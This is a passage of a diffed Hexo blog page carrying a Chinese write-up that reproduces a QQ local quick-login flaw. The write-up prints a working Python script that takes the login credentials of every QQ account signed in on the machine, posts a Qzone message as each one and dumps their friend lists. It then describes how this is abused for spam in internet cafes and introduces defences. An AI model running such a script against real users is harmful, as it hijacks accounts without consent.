class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算发送说说的防御CSRF的Token</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getACSRFToken</span><span class="params">(p_skey)</span>:</span></span><br><span class="line">    hash_v = <span class="number">5381</span></span><br><span class="line">    <span class="keyword">if</span> p_skey:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(p_skey)):</span><br><span class="line">            hash_v += (hash_v &lt;&lt; <span class="number">5</span>) + ord(p_skey[i])</span><br><span class="line">        <span class="keyword">return</span> hash_v &amp; <span class="number">2147483647</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 想要发送的说说</span></span><br><span class="line">Message = <span class="string">"This is an automated messaging test by wz"</span></span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span>,</span><br><span class="line">    <span class="string">"Referer"</span>: <span class="string">"https://i.qq.com/"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从QQ服务器获取请求本地服务器的Cookie</span></span><br><span class="line">get_local_token_url = <span class="string">"https://xui.ptlogin2.qq.com/cgi-bin/xlogin?"</span> \</span><br><span class="line">                      <span class="string">"proxy_url=https%3A//qzs.qq.com/qzone/v6/portal/proxy.html&amp;daid=5&amp;&amp;hide_title_bar=1&amp;"</span> \</span><br><span class="line">                      <span class="string">"low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;"</span> \</span><br><span class="line">                      <span class="string">"appid=549000912&amp;style=22&amp;target=self&amp;"</span> \</span><br><span class="line">                      <span class="string">"s_url=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;pt_qr_app=%E6%89%8B%E6%9C%BAQQ%E7%A9%BA%E9%97%B4&amp;"</span> \</span><br><span class="line">                      <span class="string">"pt_qr_link=http%3A//z.qzone.com/download.html&amp;self_regurl=https%3A//qzs.qq.com/qzone/v6/reg/index.html&amp;"</span> \</span><br><span class="line">                      <span class="string">"pt_qr_help_link=http%3A//z.qzone.com/download.html&amp;pt_no_auth=1"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Header头Referer字段必须为qq.com</span></span><br><span class="line">login_session = requests.Session()</span><br><span class="line">res = login_session.get(get_local_token_url, headers=header)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取关键参数pt_local_token</span></span><br><span class="line">pt_local_token = res.cookies.get(<span class="string">"pt_local_token"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 带着刚才的Cookie以及从Cookie中拿到的pt_local_tk对本地服务器进行请求</span></span><br><span class="line"><span class="comment"># 获取已登录的账号信息</span></span><br><span class="line">port = <span class="number">4301</span></span><br><span class="line">local_qq_server_url = <span class="string">"https://localhost.ptlogin2.qq.com"</span>  <span class="comment"># 建立在本地的QQ服务器地址，等待应用与其交互</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 传参获取本地已登录账号信息</span></span><br><span class="line">get_QQ_num_url = local_qq_server_url + \</span><br><span class="line">                 <span class="string">":&#123;&#125;/pt_get_uins?callback=ptui_getuins_CB&amp;r=0.7068102287925351&amp;pt_local_tk=&#123;&#125;"</span>.format(port,</span><br><span class="line">                                                                                                       pt_local_token)</span><br><span class="line"></span><br><span class="line">res = login_session.get(get_QQ_num_url, headers=header)</span><br><span class="line"><span class="comment"># 返回的账号信息是一段js的数组</span></span><br><span class="line">dic_str = <span class="keyword">None</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    dic_str = re.findall(<span class="string">"var var_sso_uin_list=(\[[\s\S]*?\])"</span>, res.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span> IndexError:</span><br><span class="line">    print(<span class="string">"Fail to get local account info. "</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================================== 显示本地登录账号信息 ===========================================</span></span><br><span class="line">account_list = eval(dic_str)</span><br><span class="line">print(<span class="string">"Detect &#123;&#125; account login locally"</span>.format(len(account_list)))</span><br><span class="line">print(<span class="string">"====================================================="</span>)</span><br><span class="line"></span><br><span class="line">account_num_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(account_list)):</span><br><span class="line">    print(<span class="string">"NO.&#123;&#125;"</span>.format(i + <span class="number">1</span>))</span><br><span class="line">    print(<span class="string">"account:&#123;&#125;\nnickname:&#123;&#125;"</span>.format(account_list[i].get(<span class="string">"account"</span>), account_list[i].get(<span class="string">"nickname"</span>)))</span><br><span class="line">    account_num_list.append(account_list[i].get(<span class="string">"account"</span>))</span><br><span class="line">print(<span class="string">"====================================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================================== 对每个账号进行快捷登录 ===========================================</span></span><br><span class="line"><span class="comment"># ===================================== 以登录QQ空间发个说说为例 ==========================================</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于已登录的账号</span></span><br><span class="line"><span class="keyword">for</span> account <span class="keyword">in</span> account_num_list:</span><br><span class="line">    <span class="comment"># 发送QQ号码及pt_local_token参数到本地服务器获取必要的Cookie，以便获取远程服务器登录许可</span></span><br><span class="line">    get_QQ_cookie_url = local_qq_server_url + \</span><br><span class="line">                        <span class="string">":&#123;&#125;/pt_get_st?callback=ptui_getst_CB&amp;"</span> \</span><br><span class="line">                        <span class="string">"r=0.7068102287925351&amp;"</span> \</span><br><span class="line">                        <span class="string">"pt_local_tk=&#123;&#125;&amp;"</span> \</span><br><span class="line">                        <span class="string">"clientuin=&#123;&#125;"</span>.format(port,</span><br><span class="line">                                              pt_local_token,</span><br><span class="line">                                              account)</span><br><span class="line"></span><br><span class="line">    res = login_session.get(get_QQ_cookie_url, headers=header)</span><br><span class="line">    <span class="comment"># 获取远程登录凭证</span></span><br><span class="line">    <span class="comment"># 其中u1为QQ空间地址（抓包可获得）</span></span><br><span class="line">    login_url = <span class="string">"https://ssl.ptlogin2.qq.com/jump?clientuin=&#123;&#125;&amp;"</span> \</span><br><span class="line">                <span class="string">"keyindex=9&amp;"</span> \</span><br><span class="line">                <span class="string">"pt_aid=549000912&amp;"</span> \</span><br><span class="line">                <span class="string">"daid=5&amp;"</span> \</span><br><span class="line">                <span class="string">"u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;"</span> \</span><br><span class="line">                <span class="string">"pt_local_tk=&#123;&#125;&amp;"</span> \</span><br><span class="line">                <span class="string">"pt_3rd_aid=0&amp;"</span> \</span><br><span class="line">                <span class="string">"ptopt=1&amp;style=40"</span>.format(account, pt_local_token)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照抓包获得的请求照样地设置了一下Referer 免得有检测</span></span><br><span class="line">    login_session.headers[<span class="string">'Referer'</span>] = get_local_token_url</span><br><span class="line">    res = login_session.get(login_url)</span><br><span class="line">    <span class="comment"># 至此获取凭证(clientkey)成功,下面获取p_skey</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 到此处会有个check操作，需要GET去请求验证一下上一个请求响应内容给的地址</span></span><br><span class="line">    <span class="comment"># ============================================ 获取p_skey ===================================================</span></span><br><span class="line">    zone_login_check_url = <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 获取认证地址及参数</span></span><br><span class="line">        zone_login_check_url = re.findall(<span class="string">"'(http.*?)'"</span>, res.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        print(<span class="string">'Fail to get login token .'</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># 发起认证请求</span></span><br><span class="line">    res = login_session.get(zone_login_check_url)</span><br><span class="line">    <span class="comment"># 一样的补一下Referer和UA</span></span><br><span class="line">    login_session.headers[<span class="string">'Referer'</span>] = <span class="string">"https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone"</span></span><br><span class="line">    login_session.headers[</span><br><span class="line">        <span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span></span><br><span class="line">    <span class="comment"># 请求对应账号的空间，获取发送说说必要参数——qzone_token(响应的JS里面获取)以及p_skey(cookie中获取)</span></span><br><span class="line">    res = login_session.get(<span class="string">"https://user.qzone.qq.com/&#123;&#125;"</span>.format(account))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取必要参数p_skey用来计算CSRFToken</span></span><br><span class="line">    p_skey = login_session.cookies.get(<span class="string">"p_skey"</span>)</span><br><span class="line">    g_tk = getACSRFToken(p_skey)  <span class="comment"># 计算CSRFToken</span></span><br><span class="line">    <span class="comment"># 从响应的页面JS中获取qzone_token</span></span><br><span class="line">    res.encoding = <span class="string">'utf-8'</span></span><br><span class="line">    qzone_token = re.findall(<span class="string">'window.g_qzonetoken = \(function\(\)&#123; try\&#123;return "([0-9a-fA-F]+?)";\&#125;'</span>, res.text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 发送说说的地址（抓包可得），并传入刚才获取的qzone_token以及g_tk</span></span><br><span class="line">    post_comment_url = <span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?"</span> \</span><br><span class="line">                       <span class="string">"qzonetoken=&#123;&#125;&amp;g_tk=&#123;&#125;"</span>.format(qzone_token, g_tk)</span><br><span class="line">    <span class="comment"># 补一下Content-Type</span></span><br><span class="line">    login_session.headers[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">    <span class="comment"># 发送说说的必要参数（抓包可得），其中con字段及说说内容</span></span><br><span class="line">    param = &#123;<span class="string">"syn_tweet_verson"</span>: <span class="string">"1"</span>, <span class="string">"paramstr"</span>: <span class="string">"1"</span>, <span class="string">"pic_template"</span>: <span class="string">""</span>, <span class="string">"richtype"</span>: <span class="string">""</span>, <span class="string">"richval"</span>: <span class="string">""</span>,</span><br><span class="line">             <span class="string">"special_url"</span>: <span class="string">""</span>, <span class="string">"subrichtype"</span>: <span class="string">""</span>, <span class="string">"who"</span>: <span class="string">"1"</span>, <span class="string">"con"</span>: Message, <span class="string">"feedversion"</span>: <span class="string">"1"</span>,</span><br><span class="line">             <span class="string">"ver"</span>: <span class="string">"1"</span>, <span class="string">"ugc_right"</span>: <span class="string">"1"</span>, <span class="string">"to_sign"</span>: <span class="string">"0"</span>, <span class="string">"hostuin"</span>: <span class="string">"3517713083"</span>, <span class="string">"code_version"</span>: <span class="string">"1"</span>, <span class="string">"format"</span>: <span class="string">"fs"</span>,</span><br><span class="line">             <span class="string">"qzreferrer"</span>: <span class="string">"https%3A%2F%2Fuser.qzone.qq.com%2F3517713083"</span>&#125;</span><br><span class="line">    <span class="comment"># 发送说说</span></span><br><span class="line">    res = login_session.post(post_comment_url, data=param)</span><br><span class="line">    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">"[+] Account &#123;&#125; send message successfully."</span>.format(account))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ================================================= 获取好友列表 =====================================================</span></span><br><span class="line">    <span class="comment"># 接口地址</span></span><br><span class="line">    get_friends_url = <span class="string">"https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?"</span> \</span><br><span class="line">                      <span class="string">"uin=&#123;&#125;&amp;follow_flag=1&amp;"</span> \</span><br><span class="line">                      <span class="string">"groupface_flag=0&amp;fupdate=1&amp;"</span> \</span><br><span class="line">                      <span class="string">"g_tk=&#123;&#125;"</span>.format(account, g_tk)</span><br><span class="line">    res = login_session.get(get_friends_url)</span><br><span class="line">    print(<span class="string">"QQ friends info."</span>)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
 <p>这一些接口其实我们都很熟悉Web页面的快捷登录，这一些操作就是模拟了浏览器或者说软件强制代替你进行了快捷登录。注意是运行在本地上的任何软件都可以做到这个目的。所以账号密码并没有被盗取，而是被一些恶意的软件盗取的登录凭证，代替你发送了垃圾信息。当然我没有讨论如何绕过网吧的还原机制，这又是另一码事了。<br>
 一些图谋不轨的人就将这些接口凑起来，写个软件种在网吧等公共上网设施，等待上Q的人帮他进行一些黑产行为，如在QQ群，空间里面发博彩、色情信息以及广告，进行牟利。这些技术并不复杂，很多初中甚至小学文化的“大黑阔”都可以写（蹲）出（牢）来（里）。</p>
 <p>防范措施：</p>
@@ -550,475 +321,93 @@
 </ol>
 <p>最后祝你生活愉快，大黑阔 😃</p>
 
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-        <div class="post-tags">
-          
-            <a href="/tags/码代码/" rel="tag"># 码代码</a>
-          
-            <a href="/tags/渗透/" rel="tag"># 渗透</a>
-          
         </div>
-      
 
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
-            
-              <a href="/2018/10/22/基于机器学习的Web日志异常检测实践/" rel="next" title="基于机器学习的Web日志异常检测实践">
-                <i class="fa fa-chevron-left"></i> 基于机器学习的Web日志异常检测实践
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2099/09/22/Notice/" rel="prev" title="Notice">
-                Notice <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-  </div>
-
-
-          </div>
-          
-
-  
-
-
-
-        </div>
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            文章目录
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            站点概览
-          </li>
-        </ul>
-      
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-            
-              <p class="site-author-name" itemprop="name">W z</p>
-              <div class="site-description motion-element" itemprop="description"></div>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
+            <section class="post-copyright">
                 
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">26</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>T3stzer0</span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-categories">
-                  
-                    
-                      <a href="/categories/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">2</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://www.testzero-wz.com/2019/01/22/记一次QQ本地快捷登录漏洞复现/">https://www.testzero-wz.com/2019/01/22/记一次QQ本地快捷登录漏洞复现/</a></span>
+                    </p>
                 
                 
-                <div class="site-state-item site-state-tags">
-                  
-                    
-                      <a href="/tags/">
-                    
-                  
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">20</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
 
-          
-
-          
-
-          
-            <div class="links-of-author motion-element">
-              
-                <span class="links-of-author-item">
-                  
-                  
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
                     
-                  
-                  
                     
-                  
-                  <a href="https://github.com/testzero-wz" title="GitHub &rarr; https://github.com/testzero-wz" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                        <a href="/tag/码代码/"># 码代码</a>
+                    
+                        <a href="/tag/渗透/"># 渗透</a>
+                    
+                        
                 </span>
-              
-                <span class="links-of-author-item">
-                  
-                  
-                    
-                  
-                  
-                    
-                  
-                  <a href="mailto:testzero.wz@gmail.com" title="E-Mail &rarr; mailto:testzero.wz@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
-                </span>
-              
             </div>
-          
-
-          
-
-          
-          
-
-          
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
             
-          
-          
+                <a class="prev" rel="prev" href="/2099/09/22/Notice/">Notice</a>
+            
+            
+            <a class="next" rel="next" href="/2018/10/22/基于机器学习的Web日志异常检测实践/">基于机器学习的Web日志异常检测实践</a>
+            
+        </section>
+
+
+    </article>
+</div>
 
         </div>
-      </div>
-
-      
-      <!--noindex-->
-        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-            
-            
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text"> 背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#冷静分析"><span class="nav-number">2.</span> <span class="nav-text"> 冷静分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#罪魁祸首快捷登录"><span class="nav-number">3.</span> <span class="nav-text"> 罪魁祸首——快捷登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#技术分析"><span class="nav-number">4.</span> <span class="nav-text"> 技术分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#对本地账号自动发一条说说"><span class="nav-number">4.1.</span> <span class="nav-text"> 对本地账号自动发一条说说</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现"><span class="nav-number">4.2.</span> <span class="nav-text"> 复现</span></a></li></ol></li></ol></div>
-            
-
-          </div>
-        </div>
-      <!--/noindex-->
-      
-
-      
-
+        <!-- 
+<footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
     </div>
-  </aside>
-  
+</footer>
 
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">W z</span>
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-<div class="busuanzi-count">
-  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-
-  
-    <span class="post-meta-item-icon">
-    
-      <i class="fa fa-user"></i>
-	  总访客:
-    </span>
-    <span class="site-uv" title="总访客量">
-      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
-    </span>
-  
-
-  
-
-  
-</div>
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-    
-
-    
-  </div>
-
-  
-
-<script>
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+-->
+    </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
 </script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  <script src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-
-  
-
-
-  <script src="/js/src/utils.js?v=7.0.1"></script>
-
-  <script src="/js/src/motion.js?v=7.0.1"></script>
-
-
-
-  
-  
-
-
-  <script src="/js/src/schemes/muse.js?v=7.0.1"></script>
-
-
-
-  
-  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
-<script src="/js/src/post-details.js?v=7.0.1"></script>
-
-
-
-  
-
-
-  <script src="/js/src/next-boot.js?v=7.0.1"></script>
-
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-
-  
-
-
-
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
